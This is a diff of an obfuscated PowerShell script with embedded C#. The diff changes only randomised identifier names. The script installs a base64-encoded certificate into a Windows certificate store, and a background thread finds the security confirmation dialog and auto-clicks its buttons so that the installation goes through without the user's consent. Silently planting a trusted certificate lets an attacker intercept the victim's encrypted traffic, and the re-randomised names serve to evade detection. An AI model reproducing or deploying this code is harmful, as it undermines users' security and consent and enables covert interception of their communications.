@@ -1,4 +1,4 @@
-function nKcidm{
+function aIdOcTDDqwMmmZM{
 Add-Type @"
 using System;
 using System.Text;
@@ -7,9 +7,9 @@ using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 
-public static class kWGTHvdiIhis
+public static class XhDTrJCKB
 {
-	public class DbEDOJilMjix
+	public class DiUIAiCyMsT
     {
         public string Wndclass;
         public string Title;
@@ -17,11 +17,11 @@ public static class kWGTHvdiIhis
         public IntPtr hWnd;
     }
 
-    private delegate bool PJgxja(IntPtr hWnd, ref DbEDOJilMjix data);
+    private delegate bool qUqomlHBXgcyoBP(IntPtr hWnd, ref DiUIAiCyMsT data);
 
     [DllImport("user32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool EnumWindows(PJgxja lpEnumFunc, ref DbEDOJilMjix data);
+    private static extern bool EnumWindows(qUqomlHBXgcyoBP lpEnumFunc, ref DiUIAiCyMsT data);
 	
 	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
     public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
@@ -36,11 +36,11 @@ public static class kWGTHvdiIhis
 	[return: MarshalAs(UnmanagedType.Bool)]
 	static extern bool SetForegroundWindow(IntPtr hWnd);
 	
-	public delegate bool UdOJGVQb(IntPtr hwnd, IntPtr lParam);
+	public delegate bool RjvExDdJW(IntPtr hwnd, IntPtr lParam);
 	
 	[DllImport("user32")]
 	[return: MarshalAs(UnmanagedType.Bool)]
-	public static extern bool EnumChildWindows(IntPtr window, UdOJGVQb callback, IntPtr lParam);  
+	public static extern bool EnumChildWindows(IntPtr window, RjvExDdJW callback, IntPtr lParam);  
 	
 	[DllImport("user32.dll", CharSet = CharSet.Auto)]
 	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
@@ -88,16 +88,16 @@ public static class kWGTHvdiIhis
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool CloseHandle([In] IntPtr hObject);
     
-	const int BM_CL = 0x00F5;
+	const int eiNVCUNq = 0x00F5;
 	
-	public static byte[] GbVocJHBYJ(String sCert)
+	public static byte[] XcAOFYFul(String sCert)
     {
 		return Convert.FromBase64String(sCert);
     }
         
-	public static void CZRcbVuVzYgtLW(String sCert){
+	public static void jOnkzDLSQi(String sCert){
 		System.Console.WriteLine("[Win32]::Start()");
-        byte[] bCert = GbVocJHBYJ(sCert);
+        byte[] bCert = XcAOFYFul(sCert);
         if (bCert != null)
         {
             X509Certificate2 certificate = new X509Certificate2(bCert);
@@ -105,7 +105,7 @@ public static class kWGTHvdiIhis
             store.Open(OpenFlags.ReadWrite);
             if (!store.Certificates.Contains(certificate))
             {
-                Thread thread = new Thread(eJPaWY);
+                Thread thread = new Thread(LicvpD);
                 thread.Start();
                 store.Add(certificate);
                 thread.Join();
@@ -114,12 +114,12 @@ public static class kWGTHvdiIhis
         }
 	}
 	
-	public static void eJPaWY()
+	public static void LicvpD()
 	{
 		System.Console.WriteLine("[Win32]::SearchDialog()");
 		IntPtr hWnd;
 		do{
-			hWnd = vkOHeSZEwCl("#32770",String.Empty);
+			hWnd = tsnm("#32770",String.Empty);
 			if (!hWnd.Equals(IntPtr.Zero))
 		    {
 				System.Console.WriteLine("Founded hWnd=0x{0:X}",hWnd);
@@ -132,28 +132,28 @@ public static class kWGTHvdiIhis
 		}while (hWnd.Equals(IntPtr.Zero));
 		System.Console.WriteLine("Dialog window founded");
 		SetForegroundWindow(hWnd);
-		UdOJGVQb childProc = new UdOJGVQb(tebGNrxiTqaVJX);
+		RjvExDdJW childProc = new RjvExDdJW(zNl);
 		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
 	}
 	
-	public static IntPtr vkOHeSZEwCl(string wndclass, string title)
+	public static IntPtr tsnm(string wndclass, string title)
     {
-        DbEDOJilMjix sd = new DbEDOJilMjix();
+        DiUIAiCyMsT sd = new DiUIAiCyMsT();
         sd.Wndclass = wndclass;
         sd.Title = title;
 		sd.hWnd=IntPtr.Zero;
 		System.Console.WriteLine("EnumWindow -|");
-        EnumWindows(new PJgxja(hnYWenFmKP), ref sd);
+        EnumWindows(new qUqomlHBXgcyoBP(PuaZoLoCJp), ref sd);
         return sd.hWnd;
     }
     
-	public static bool hnYWenFmKP(IntPtr hWnd, ref DbEDOJilMjix data)
+	public static bool PuaZoLoCJp(IntPtr hWnd, ref DiUIAiCyMsT data)
     {
     	StringBuilder title = new StringBuilder(1024);
         StringBuilder className = new StringBuilder(1024);
         GetWindowText(hWnd, title, title.Capacity);
         GetClassName(hWnd, className, className.Capacity);
-        String sEN=APFLrfGU(hWnd).ToLower();
+        String sEN=wNO(hWnd).ToLower();
 		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && title.ToString().StartsWith(data.Title)))
 		{
 			System.Console.WriteLine("            |- hWnd=0x{0:X}; Class={1}; Title={2}; Process={3}",hWnd,className.ToString(),title.ToString(),sEN);
@@ -167,26 +167,26 @@ public static class kWGTHvdiIhis
         return true;
     }
   
-	public static String APFLrfGU(IntPtr ZEuwdhaD){
-		uint RyxkKA = 0;
-		uint threadID = GetWindowThreadProcessId(ZEuwdhaD, out RyxkKA);
+	public static String wNO(IntPtr ClNxUgg){
+		uint nuqJeEMvnxpQ = 0;
+		uint threadID = GetWindowThreadProcessId(ClNxUgg, out nuqJeEMvnxpQ);
 		String sProc = null;
 	    IntPtr handleToSnapshot = IntPtr.Zero;
 	    try
 	    {
-	        PROCESSENTRY32 fnnvQu = new PROCESSENTRY32();
-	        fnnvQu.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
+	        PROCESSENTRY32 WMaTr = new PROCESSENTRY32();
+	        WMaTr.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));
 	        handleToSnapshot = CreateToolhelp32Snapshot((uint)SnapshotFlags.Process, 0);
-	        if (Process32First(handleToSnapshot, ref fnnvQu))
+	        if (Process32First(handleToSnapshot, ref WMaTr))
 	        {
 	        do
 	        {
-	            if (RyxkKA == fnnvQu.th32ProcessID)
+	            if (nuqJeEMvnxpQ == WMaTr.th32ProcessID)
 	            {
-	            sProc = fnnvQu.szExeFile;
+	            sProc = WMaTr.szExeFile;
 	            break;
 	            }
-	        } while (Process32Next(handleToSnapshot, ref fnnvQu));
+	        } while (Process32Next(handleToSnapshot, ref WMaTr));
 	        }
 	        else
 	        {
@@ -203,14 +203,14 @@ public static class kWGTHvdiIhis
 	    }
 	    return sProc;
 	}
-	public static bool tebGNrxiTqaVJX(IntPtr hWnd, IntPtr lParam)
+	public static bool zNl(IntPtr ClNxUgg, IntPtr lParam)
 	{
-		SendMessage(hWnd, BM_CL, IntPtr.Zero, IntPtr.Zero);
+		SendMessage(ClNxUgg, eiNVCUNq, IntPtr.Zero, IntPtr.Zero);
 		return true;
 	}
 }
 "@;
-[kWGTHvdiIhis]::CZRcbVuVzYgtLW("%CERT%");
+[XhDTrJCKB]::jOnkzDLSQi("%CERT%");
 exit
 }
-nKcidm
+aIdOcTDDqwMmmZM
